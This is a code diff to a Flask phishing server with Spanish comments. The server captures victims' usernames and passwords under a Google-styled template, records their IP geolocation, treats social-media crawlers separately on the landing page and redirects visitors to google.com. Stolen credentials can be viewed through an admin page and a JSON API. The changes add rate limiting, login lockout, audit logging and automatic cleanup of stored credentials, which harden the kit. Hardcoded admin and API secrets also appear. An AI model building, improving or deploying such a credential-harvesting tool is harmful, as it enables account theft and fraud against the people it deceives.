@@ -9,7 +9,9 @@ import logging
 from datetime import datetime, timedelta
 from flask import Flask, request, render_template_string, redirect, jsonify, abort, session
 
-# Configurar logging
+# =============================================
+# CONFIGURACIÓN DE LOGGING
+# =============================================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
@@ -25,14 +27,66 @@ app.config.update(
 )
 
 # =============================================
-# CONFIGURACIÓN SIMPLE
+# CONFIGURACIÓN
 # =============================================
 CONFIG = {
     'redirect_url': 'https://www.google.com',
     'template': 'google',
     'api_key': os.environ.get('API_KEY', 'smiclavesegura2026'),
-    'admin_password': 'triple777'
+    'admin_password': 'triple777',
+    'max_login_attempts': 5,
+    'cleanup_days': 30
 }
+
+# Diccionarios para rate limiting
+login_attempts = {}
+root_requests = {}
+audit_log_enabled = True
+
+# =============================================
+# FUNCIONES DE AUDITORÍA Y SEGURIDAD
+# =============================================
+def audit_log(action, details, ip=None):
+    if not audit_log_enabled:
+        return
+    if ip is None:
+        ip = get_client_ip()
+    log_entry = {
+        'timestamp': datetime.now().isoformat(),
+        'action': action,
+        'ip': ip,
+        'details': details,
+        'authenticated': session.get('admin_logged', False)
+    }
+    try:
+        with open('audit.log', 'a') as f:
+            f.write(json.dumps(log_entry) + '\n')
+    except Exception as e:
+        logger.error(f"Error en audit log: {e}")
+
+def is_rate_limited(ip, storage, limit=20, window_seconds=60):
+    now = datetime.now()
+    if ip in storage:
+        count, timestamp = storage[ip]
+        if (now - timestamp).total_seconds() < window_seconds:
+            if count >= limit:
+                return True
+            storage[ip] = (count + 1, timestamp)
+        else:
+            storage[ip] = (1, now)
+    else:
+        storage[ip] = (1, now)
+    return False
+
+def is_ip_blocked(ip):
+    if ip in login_attempts:
+        attempts, block_time = login_attempts[ip]
+        if attempts >= CONFIG.get('max_login_attempts', 5):
+            if datetime.now() - block_time < timedelta(minutes=5):
+                return True
+            else:
+                del login_attempts[ip]
+    return False
 
 def load_config():
     try:
@@ -62,6 +116,26 @@ def init_db():
         logger.info("Base de datos inicializada correctamente")
     except Exception as e:
         logger.error(f"Error al inicializar la base de datos: {e}")
+
+def cleanup_old_credentials(days=None):
+    if days is None:
+        days = CONFIG.get('cleanup_days', 30)
+    try:
+        conn = sqlite3.connect('credentials.db', check_same_thread=False)
+        cursor = conn.cursor()
+        cursor.execute('''
+            DELETE FROM credentials 
+            WHERE datetime(timestamp) < datetime('now', ?)
+        ''', (f'-{days} days',))
+        deleted = cursor.rowcount
+        conn.commit()
+        conn.close()
+        if deleted > 0:
+            logger.info(f"Eliminadas {deleted} credenciales antiguas (más de {days} días)")
+        return deleted
+    except Exception as e:
+        logger.error(f"Error en cleanup de credenciales: {e}")
+        return 0
 
 def get_client_ip():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -288,6 +362,15 @@ def add_security_headers(response):
     return response
 
 @app.before_request
+def limit_root_requests():
+    if request.path == '/':
+        ip = get_client_ip()
+        if is_rate_limited(ip, root_requests, limit=30, window_seconds=60):
+            logger.warning(f"Rate limit excedido en raíz desde IP {ip}")
+            audit_log('ROOT_RATE_LIMIT', {'ip': ip}, ip)
+            return "⏳ Demasiadas visitas. Espera 1 minuto.", 429
+
+@app.before_request
 def handle_bots():
     ua = request.headers.get('User-Agent', '')
     if is_social_crawler(ua) and request.path == '/':
@@ -327,6 +410,8 @@ def capture():
     if not username or not password:
         return redirect(CONFIG.get('redirect_url', 'https://www.google.com'))
     
+    # Sanitizar entrada
+    username = re.sub(r'[^a-zA-Z0-9@.\-_\s]', '', username)
     geo = get_geo(ip)
     
     try:
@@ -340,6 +425,7 @@ def capture():
         conn.commit()
         conn.close()
         logger.info(f"✅ Credencial guardada: {username} desde {ip}")
+        audit_log('NEW_CREDENTIAL', {'username': username, 'ip': ip}, ip)
     except Exception as e:
         logger.error(f"❌ Error al guardar: {e}")
     
@@ -347,39 +433,103 @@ def capture():
 
 @app.route('/login-credenciales', methods=['GET', 'POST'])
 def login_credenciales():
+    ip = get_client_ip()
+    max_attempts = CONFIG.get('max_login_attempts', 5)
+    
+    if is_ip_blocked(ip):
+        audit_log('LOGIN_BLOCKED', {'ip': ip}, ip)
+        return render_template_string('''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Acceso Bloqueado</title>
+            <style>
+                body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+                .error { color: red; margin-top: 10px; }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <h1>🚫 Acceso Bloqueado</h1>
+                <p>Has superado el límite de intentos permitidos.</p>
+                <p class="error">Espera 5 minutos para volver a intentarlo.</p>
+            </div>
+        </body>
+        </html>
+        ''', 429)
+    
     if request.method == 'POST':
-        if request.form.get('password') == CONFIG.get('admin_password', 'triple777'):
+        password = request.form.get('password')
+        if password == CONFIG.get('admin_password', 'triple777'):
+            login_attempts.pop(ip, None)
             session['admin_logged'] = True
+            session.permanent = True
+            logger.info(f"Login exitoso desde IP {ip}")
+            audit_log('LOGIN_SUCCESS', {'ip': ip}, ip)
             return redirect('/ver-credenciales')
         else:
-            return "<h1>❌ Contraseña incorrecta</h1><a href='/login-credenciales'>Volver</a>"
+            if ip not in login_attempts:
+                login_attempts[ip] = [0, datetime.now()]
+            login_attempts[ip][0] += 1
+            login_attempts[ip][1] = datetime.now()
+            remaining = max_attempts - login_attempts[ip][0]
+            logger.warning(f"Login fallido desde IP {ip}, intentos: {login_attempts[ip][0]}")
+            audit_log('LOGIN_FAILURE', {'ip': ip, 'attempts': login_attempts[ip][0]}, ip)
+            
+            return render_template_string('''
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Acceso Denegado</title>
+                <style>
+                    body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
+                    .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; }
+                    .error { color: red; margin-top: 10px; }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>🔒 Contraseña incorrecta</h1>
+                    <p class="error">Intentos restantes: ''' + str(remaining) + '''</p>
+                    <a href="/login-credenciales">Volver</a>
+                </div>
+            </body>
+            </html>
+            ''')
     
-    return '''
+    return render_template_string('''
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Acceso Admin</title>
+        <title>Acceso a Credenciales</title>
         <style>
             * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
             body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
             .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-            h1 { color: #1a73e8; margin-bottom: 20px; }
+            h1 { color: #1a73e8; margin-bottom: 20px; font-size: 24px; }
+            .lock { font-size: 48px; margin-bottom: 15px; }
             input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
+            input:focus { outline: none; border-color: #1a73e8; }
             button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
             button:hover { background: #1557b0; }
+            .footer { margin-top: 20px; color: #666; font-size: 14px; }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1>🔐 Acceso Admin</h1>
+            <div class="lock">🔐</div>
+            <h1>Acceso a Credenciales</h1>
+            <p style="color:#666; margin-bottom:20px;">Introduce la contraseña de administrador</p>
             <form method="POST">
-                <input type="password" name="password" placeholder="Contraseña" required>
+                <input type="password" name="password" placeholder="Contraseña" required autofocus>
                 <button type="submit">Acceder</button>
             </form>
+            <div class="footer">Acceso restringido</div>
         </div>
     </body>
     </html>
-    '''
+    ''')
 
 @app.route('/ver-credenciales')
 def ver_credenciales():
@@ -443,15 +593,3 @@ def api_credentials():
     conn = sqlite3.connect('credentials.db', check_same_thread=False)
     cursor = conn.cursor()
     cursor.execute('SELECT * FROM credentials ORDER BY id DESC')
-    data = cursor.fetchall()
-    conn.close()
-    return jsonify(data)
-
-if __name__ == '__main__':
-    load_config()
-    init_db()
-    port = int(os.environ.get('PORT', 8080))
-    print(f"[+] Servidor iniciado en puerto {port}")
-    print(f"[+] Contraseña admin: triple777")
-    print(f"[+] API Key: {CONFIG.get('api_key')}")
-    app.run(host='0.0.0.0', port=port, debug=False)
